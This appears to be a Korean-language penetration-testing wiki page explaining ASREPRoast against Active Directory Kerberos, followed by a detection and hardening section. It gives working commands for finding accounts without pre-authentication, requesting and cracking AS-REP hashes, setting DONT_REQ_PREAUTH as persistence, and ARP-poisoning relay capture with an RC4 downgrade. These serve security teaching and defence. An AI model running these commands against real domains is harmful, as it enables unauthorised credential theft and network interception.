# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast는 **Kerberos pre-authentication required attribute**가 없는 사용자를 악용하는 보안 공격입니다. 기본적으로 이 취약점으로 인해 공격자는 사용자의 비밀번호 없이도 Domain Controller (DC)에 사용자 인증을 요청할 수 있습니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지를 응답으로 보내며, 공격자는 오프라인에서 이를 크랙해 사용자의 비밀번호를 알아낼 수 있습니다.

이 공격의 주요 요건은 다음과 같습니다.

- **Kerberos pre-authentication 부재**: 대상 사용자에게 이 보안 기능이 활성화되어 있지 않아야 합니다.
- **Domain Controller (DC)에 연결**: 공격자는 요청을 보내고 암호화된 메시지를 받기 위해 DC에 접근할 수 있어야 합니다.
- **선택적 도메인 계정**: 도메인 계정이 있으면 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 계정이 없다면 공격자는 사용자 이름을 추측해야 합니다.

#### 취약한 사용자 열거 (도메인 자격 증명 필요)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### AS_REP 메시지 요청

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus는 기본적으로 **RC4**를 요청하므로, Event ID **4768**에는 보통 **preauth type 0**, **ticket encryption type 0x17**이 표시됩니다. **`/aes`**를 추가하거나 대상에서 RC4가 비활성화되어 있으면 **AES etypes**가 표시됩니다.<sup>[[2]](#references)</sup>

#### 빠른 한 줄 명령어 (Linux)

- 먼저 Kerberos userenum으로 잠재적 대상을 열거합니다(예: leak된 build paths에서): `kerbrute userenum users.txt -d domain --dc dc.domain`
- 유효한 creds 없이 NetExec으로 전체 사용자 이름 목록을 대상으로 roast합니다: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- creds가 있다면 NetExec이 LDAP를 조회하고 roast 가능한 모든 계정을 대신 요청하도록 합니다: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 출력이 **`$krb5asrep$23$`**로 시작하면 Hashcat **`-m 18200`**으로 크랙합니다. **`$krb5asrep$17$`** 또는 **`$krb5asrep$18$`**로 시작하면 John **`--format=krb5asrep`**을 사용하는 편이 좋습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 크래킹

모든 AS-REP roast가 RC4라고 가정하지 마세요. 최신 도구는 요청되거나 협상된 enctype에 따라 **RC4** (`$krb5asrep$23$`) 또는 **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`)를 반환할 수 있습니다. **`hashcat -m 18200`**은 **etype 23**용이며, **John**은 `krb5asrep`을 사용해 **17/18/23**을 직접 처리합니다.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

**GenericAll** 권한(또는 속성을 쓸 수 있는 권한)이 있는 사용자의 경우 **preauth**를 강제할 필요가 없습니다:

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### 탐지 및 보안 강화

**사전 인증 없이 AS-REP 요청**이 성공하면 DC에 `Status=0x0`, `PreAuthType=0`인 **4768** 이벤트가 생성됩니다. 이는 요청이 있었다는 기록일 뿐, 누군가 응답을 크랙했거나 계정을 침해했다는 증거는 아닙니다. 탐지 시 RC4를 필수 조건으로 삼지 마세요. `TicketEncryptionType=0x17`은 취약한 암호화의 유용한 신호지만, 공격자는 AES를 요청할 수도 있습니다(이벤트 로그 값 `0x11`/`0x12`). 2025년 1월 14일 또는 그 이후의 누적 업데이트가 설치된 Windows Server 2016 이상에서는 4768 이벤트 버전 2에 `ClientAdvertizedEncryptionTypes`, 계정/DC가 지원하는 etype 및 사용 가능한 키도 표시됩니다.<sup>[[5]](#references)</sup>

실용적인 헌팅에서는 계정에 AES 키가 있는데 클라이언트가 RC4만 광고하는 경우를 표시한 다음, 여러 사전 인증이 필요 없는 사용자에 대해 단일 소스 IP에서 발생한 요청 급증을 상호 연관시킵니다. 모든 `PreAuthType=0` 이벤트에 경고를 보내기보다는 정상적인 예외를 기준선으로 설정하세요.

요청 주체를 파악하려면 `IpAddress` 필드(여기에는 `::ffff:`로 매핑된 IPv4 주소가 포함될 수 있음)를 정규화하고, 시간 범위를 4769 서비스 티켓 또는 5140 공유 접근 이벤트와 비교하세요. 이러한 이벤트에는 같은 주소에서 활동한 계정이 표시될 수 있지만, 사전 인증이 필요 없는 AS-REP 요청에는 인증된 계정이 필요하지 않습니다. 공유 호스트, NAT, 프록시 및 여러 세션 때문에 IP가 일치하더라도 AS-REQ를 보낸 사람이나 계정을 **식별할 수는 없습니다**. 관련 계정을 조사 단서로 취급하고 엔드포인트 또는 네트워크 증거로 교차 확인하세요.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

지속적인 해결책은 사전 인증이 꼭 필요하지 않은 모든 사용자에 대해 **Do not require Kerberos preauthentication**을 해제하고 노출된 계정의 비밀번호를 변경하는 것입니다. 예외를 제거할 수 없다면 길고 무작위로 생성된 비밀번호를 사용하고 권한을 최소화하세요. RC4를 비활성화하면 크래킹 비용이 높아지지만, AES AS-REP 응답도 오프라인에서 크랙할 수 있으므로 로스팅 취약점 자체가 사라지지는 않습니다.<sup>[[2]](#references)[[5]](#references)</sup>

## 자격 증명 없이 ASREProast

온패스 공격자는 정상적인 사전 인증 AS 교환 중 반환되는 AS-REP를 캡처하고, 암호화된 부분을 오프라인 크래킹용으로 가공할 수 있습니다. 고전적인 ASREPRoasting과 달리 `DONT_REQ_PREAUTH`가 필요하지 않지만, 실제로 Kerberos 교환이 가로채진 계정만 대상으로 삼을 수 있습니다. **ASRepCatcher**는 기본적으로 단방향 ARP poisoning으로 공격 위치를 확보하거나, `--disable-spoofing`을 사용해 다른 MitM 기법으로부터 트래픽을 받을 수 있습니다.<sup>[[6]](#references)</sup>\
사전 인증이 없는 주체로부터 **TGT** 대신 **서비스 티켓**을 반환받는 관련 자격 증명 없는 기법은 [Kerberoast](kerberoast.md)를 참조하세요.

`relay` 모드에서 [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)는 가로챈 AS-REQ를 전달하고 양쪽 모두 여전히 허용하는 경우 **RC4**를 강제합니다. `listen`은 패킷을 변경하지 않으므로 클라이언트와 DC가 협상한 enctype을 캡처합니다. 가능하면 전체 서브넷에 영향을 주는 대신 `-t`/`-tf`로 poisoning 대상을 지정하세요.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – 이벤트 4768: Kerberos 인증 티켓이 요청됨](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – 보안 이벤트 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – 보안 이벤트 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
